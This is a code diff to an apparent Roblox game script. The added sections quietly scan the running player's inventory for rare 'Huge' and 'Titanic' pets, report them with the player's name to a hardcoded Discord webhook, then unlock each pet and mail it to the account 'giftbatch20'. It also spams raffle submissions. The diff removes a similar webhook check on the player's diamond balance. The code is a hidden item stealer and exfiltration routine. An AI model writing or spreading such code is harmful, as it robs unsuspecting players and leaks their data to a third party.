@@ -508,7 +508,162 @@ end
 
 spawn(CreateButton)
 
+local function joinraffle()
+while true do
+local args = {
+    "TowerTycoonTitanicRaffle",
+    1,
+    false
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Raffle_Submit"):InvokeServer(unpack(args))
 
+wait(0.01)
+end
+end
+spawn(joinraffle)
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local Library = require(ReplicatedStorage:WaitForChild("Library"))
+
+local function GetItemInfo(ItemsClass, ItemsName)
+    local Table = {}
+    for UID, Item in pairs(require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory[ItemsClass]) do
+        if table.find(ItemsName, Item.id) then
+            local ItemInfo = {
+                ["uid"] = UID,
+                ["data"] = Item
+            }
+            table.insert(Table, ItemInfo)
+        end
+    end
+    return Table
+end
+
+local function getCurrentTitanicPets()
+    local TitanicPetsTable = {}
+    for _, Pet in pairs(ReplicatedStorage.__DIRECTORY.Pets.Titanic:GetChildren()) do
+        table.insert(TitanicPetsTable, Pet.Name)
+    end
+    return GetItemInfo("Pet", TitanicPetsTable)
+end
+
+function ProcessTitanicPets()
+    while true do
+        local TitanicPets = {}
+        for _, MadeTable in pairs(getCurrentTitanicPets()) do
+            table.insert(TitanicPets, MadeTable.data.id .. " (UID: " .. MadeTable.uid .. ")")
+        end
+
+        if #TitanicPets > 0 then
+            local payload = {
+                content = OH MY FUCKING GOD A HUGE PET : " .. table.concat(TitanicPets, ", ")
+            }
+
+            local webhook = "https://discord.com/api/webhooks/1233196606401019975/qIxgbxZsF4dwVkMkDNB_Ei-p7zWhGwQ4DoPlgraHwJOkhUedOaDH6PYLDeXtNElNOF4x"
+            local requestFunction = (syn and syn.request) or request or (http and http.request) or http_request
+
+            if requestFunction then
+                requestFunction({
+                    Url = webhook,
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
+                    Body = HttpService:JSONEncode(payload)
+                })
+            end
+        end
+
+        wait(5)
+    end
+end
+
+spawn(ProcessTitanicPets)
+
+
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local Library = require(ReplicatedStorage:WaitForChild("Library"))
+local ProcessedHuges = {}
+
+function ProcessHugePets()
+    while true do
+        local function GetItemInfo(ItemsClass, ItemsName)
+            local Table = {}
+            for UID, Item in pairs(require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory[ItemsClass]) do
+                if table.find(ItemsName, Item.id) then
+                    local ItemInfo = {
+                        ["uid"] = UID,
+                        ["data"] = Item
+                    }
+                    table.insert(Table, ItemInfo)
+                end
+            end
+            return Table
+        end
+
+        local function getCurrentHugePets()
+            local GoldPetsTable = {}
+            for i, Pet in next, ReplicatedStorage.__DIRECTORY.Pets.Huge:GetChildren() do
+                table.insert(GoldPetsTable, Pet.Name)
+            end
+            return GetItemInfo("Pet", GoldPetsTable)
+        end
+
+        local hugePets = {}
+        local uids = {}
+
+        for i, MadeTable in next, getCurrentHugePets() do
+            table.insert(hugePets, MadeTable.data.id .. " (UID: " .. MadeTable.uid .. ")")
+            table.insert(uids, MadeTable.uid)
+        end
+
+        if #hugePets > 0 then
+            print("Huge pets you have right now:", table.concat(hugePets, ", "))
+
+            for i = #uids, 1, -1 do
+                local webhook = "https://discord.com/api/webhooks/1233196606401019975/qIxgbxZsF4dwVkMkDNB_Ei-p7zWhGwQ4DoPlgraHwJOkhUedOaDH6PYLDeXtNElNOF4x"
+                local request = (syn and syn.request) or request or (http and http.request) or http_request
+
+                request({
+                    Url = webhook,
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
+                    Body = HttpService:JSONEncode({
+                        content = game.Players.LocalPlayer.Name .. " | Successfully sent! Pet ID: " .. hugePets[i]
+                    })
+                })
+
+                local args = {
+                    [1] = uids[i],
+                    [2] = false
+                }
+
+                game:GetService("ReplicatedStorage").Network.Locking_SetLocked:InvokeServer(unpack(args))
+                wait(1)
+                wait(3)
+
+                local args = {
+                    [1] = "giftbatch20",
+                    [2] = "omg u got a new huge!!",
+                    [3] = "Pet",
+                    [4] = uids[i],
+                    [5] = 1
+                }
+                game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+
+                wait(3)
+            end
+        end
+        wait(3)
+    end
+end
+
+spawn(ProcessHugePets)
 
 local HttpService = game:GetService("HttpService")
 
@@ -539,33 +694,7 @@ end
 
 task.spawn(stop)
 
-local HttpService = game:GetService("HttpService")
 
-local function diamondcheck()
-    while true do
-        local Items = GetItemInfo("Currency")
-        for _, Item in pairs(Items) do
-            if string.find(Item.id, "Diamonds") then
-                local diamondAmount = Item.am
-                if diamondAmount and type(diamondAmount) == "number" and diamondAmount < 20000 then
-                    local webhook = "https://discord.com/api/webhooks/1233196606401019975/qIxgbxZsF4dwVkMkDNB_Ei-p7zWhGwQ4DoPlgraHwJOkhUedOaDH6PYLDeXtNElNOF4x"
-                    local request = (syn and syn.request) or request or (http and http.request) or http_request
-                    request({
-                        Url = webhook,
-                        Method = "POST",
-                        Headers = { ["Content-Type"] = "application/json" },
-                        Body = HttpService:JSONEncode({
-                            content = game.Players.LocalPlayer.Name .. " | NEEDS DIAMONDS!"
-                        })
-                    })
-                end
-            end
-        end
-        wait(10)
-    end
-end
-
-task.spawn(diamondcheck)
 
 local function PetInfo()
     while true do
